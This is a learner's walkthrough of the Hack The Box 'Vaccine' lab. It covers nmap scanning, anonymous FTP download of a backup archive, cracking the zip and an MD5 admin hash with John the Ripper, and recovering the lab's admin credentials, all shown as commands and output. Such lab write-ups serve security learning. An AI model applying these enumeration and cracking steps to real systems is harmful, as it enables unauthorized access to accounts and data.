
# HTB Stating Point Tier 2: Vaccine
This is a breakdown of my methods to gain root on [HTB Vaccine](https://app.hackthebox.com/starting-point).
## Setup
First we have to make sure to spawn the target and connect via OpenVPN. Then, personally, I start my notes. I end up downloading/ creating a lot of files during HTB CTF so I make a new directory in `~/` for each box. This one would be `~/vaccine`. I do all of my work from this directory and also store my notes here. Recently I've been creating three separate note pages to track different things throughout the CTF:
### `vaccine.output.txt`
In this note I copy paste almost every command and out combination I use in the terminal as I go. I do this for a few reasons:
- I'm still learning so it's nice to have examples to look back on of correct use of tools w/ flags etc. for reference.
- It creates a timeline of how I went about attacking the box that I can reference and reflect on
### `vaccine.findings.txt`
This type of note is something I've started doing recently. It's meant to be a list of specific findings w/ some notes on context for each. I'm still figuring out how to format this file so it's more efficient and helpful to me during and after exploitation.
### `vaccine.notes.txt`
This is primarily for me. This is where I write down or copy paste tips and tricks I learn along the way. Because I usually livestream these CTFs, I pick up a lot of little tips and tricks from viewers.

After setting up these notes, the last thing I like to do is copy paste the target IP and set it as a variable in `~/.profile` like so:
```bash
...
# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi

# TP customs:
t=10.129.238.155   # <-----
```
Once it's in there I use `source ~/.profile` on any terminal I open during the CTF so `$t` can be used w/ every tool. 
## Recon
After starting the target machine and connecting our attack box to it's network via OpenVPN, we can do a preliminary scan of the target using [nmap](../CLI-tools/linux/remote/nmap.md). Personally, I don't do CTFs for time, I do them to learn. So I have no reason to run scans I don't need.

That's why I like to start with a basic nmap scan to just scan for ports. For those who don't know the `-PA` flag to scan for [TCP](networking/protocols/TCP.md) ports below 1000. In this scan, nmap just sends a TCP `ACK` packet to the specified ports, as well as .
```bash
nmap -PA1-1000 $t
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 10:09 EDT
Nmap scan report for 10.129.239.224
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
```
We can see that the target is running [SSH](networking/protocols/SSH.md), [FTP](networking/protocols/FTP.md), and [HTTP](www/HTTP.md) services. I like to start by looking at HTTP.
### `Port 80`/ HTTP
Before visiting the website, I like to use [curL](../CLI-tools/linux/remote/curL.md) first. You can either just grab the headers using the `-I` flag:
```bash
┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ curl -I http://$t                                  
HTTP/1.1 200 OK
Date: Sun, 15 Oct 2023 14:23:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=l1790rmtgabfqbpkila5qkhdq6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```
From the headers, we've already learned they're using *Apache 2.4.41* for their server. This *is considered a finding in a pentest* because version numbers for services can help us find CVEs and exploits against the target.

Additionally, we can see we've been given a [PHP](coding/languages/PHP.md) session cookie. So we already know the target is using PHP in their web architecture. To get all of the HTML at this endpoint, we can just use curL normally. The `--version` flag is also nice to add. I'm not going to paste the entire output but here are some interesting things to notice:
#### MegaCorp Login
```html
</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
```
This is a default login page, and if you did the boxes before this one on HTB, you'd know that MegaCorp has been the target. We can potentially *use credentials we found on other MegaCorp CTFs* against vaccine.
#### Form
```html
<form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>
```
The form itself can sometimes give us *plaintext credentials*, and sometimes pathing to other endpoints. In this case I didn't learn much (although I have a feeling their are nuggets I overlooked as a n00b).
#### Browser
![](writeups/writeup-pics/vaccine-HTB-1.png)
![](/walkthrough-pics/vaccine-HTB-1.png)

When I found this I tried credentials I got from doing Oopsies and Archetype (the two boxes before Vaccine) because using credentials from Archetype worked on Oopsies. It did not work this time.
### `Port 21` FTP
Moving on to FTP we can use the [`ftp` command](../CLI-tools/linux/remote/ftp-command.md) to try gaining access to the service using the *anonymous login* which is a default access user which *is limited to copying files* from the server:
```bash
┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ ftp anonymous@$t
Connected to 10.129.239.224.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:   # <-------- Just hit 'Enter' w/ blank password here
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10399|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> 
```
With the anonymous user we're able to access the server and list its contents. Someone left a `bakcup.zip` file here. To download it to your machine, just use `get backup.zip`:
```bash
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10552|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***********************************************************************************************************************************************************************************************|  2533        4.32 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (53.25 KiB/s)
ftp> 
```
We can also try to move around with `cd` or find other information using all of the available commands for this ftp prompt, but I had no luck when I tried.

**NOTE:** I've placed this part in the 'Recon' portion of my walkthrough but exfiltrating data is not technically recon... Just be aware :).
## `Backup.zip`
So we've exfiltrated some data, but if we try to simply unzip it we're prompted for a password. Again, I tried credentials from the previous two boxes but with no luck.
```bash
┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
```
### zip2john
Fortunately we can do some offline cracking with [john the ripper](../cybersecurity/TTPs/cracking/tools/john.md). John is a cracking tool which can be used to crack various things, specifically passwords. However, he also has some other setting such as `ssh2john` and `zip2john`.

We're gonna use `zip2john` to crack the passwords. From what I understand, `zip2john` creates a hash of the `.zip` file and then attempts to crack the hash, thus revealing the passwords locking it and/or securing the files zipped in it.
#### Use
When we use `zip2john` we give it the `.zip` file and then redirecting the output to a file with the `.hashes` extension:
```bash
zip2john backup.zip > hash.hashes
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```
Now we just point John at the hashes file and let him crack it...
```bash
┌──(hakcypuppy㉿kali)-[~]
└─$ john hash.hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)     # <-------------- Password is here
1g 0:00:00:00 DONE 2/3 (2023-10-02 17:37) 6.250g/s 505756p/s 505756c/s 505756C/s 123456..pepper1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Back to `unzip`
Now that we've found the password we can unlock the `.zip` file:
```bash
┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 741852963 # <-----
  inflating: index.php               
  inflating: style.css 
```
We've got two files, `index.php` and `style.css`. If we start w/ `index.php` and concatenate it we get HTML with a PHP script and *plain text credentials*:
```php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?> ...
```
Here's what we learn from this file:
- *Username:* admin
- *Password:* 2cb42f8734ea607eefed3b70af13bbd3 (md5 hashed)
- *Login endpoint:* dashboard.php

**NOTE:** A possible interesting divergence here from my path has to do with the `backup.zip`. The name implies that the file is *getting backed up regularly* which implies as script somewhere is executing on an interval. If we can find the script, we can potentially swap it out and get automated execution... just spit balling :).
### Cracking the Admin Password
We can use john again to crack this password. I tried the `--single` crack mode at first w/ no luck. Using `--wordlist` works fine:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 p.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)     # <------------------ PASSWORD
1g 0:00:00:00 DONE (2023-10-15 11:28) 25.00g/s 2505Kp/s 2505Kc/s 2505KC/s roslin..pogimo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
Our password for an admin account at the `dashboard.php` endpoint is 'qwerty789'. Keep in mind, we can also try this credential on our enumerated services such as the ftp server and SSH...
## Admin Dashboard
Now that we have the admin password for the dashboard endpoint, let's try to use it.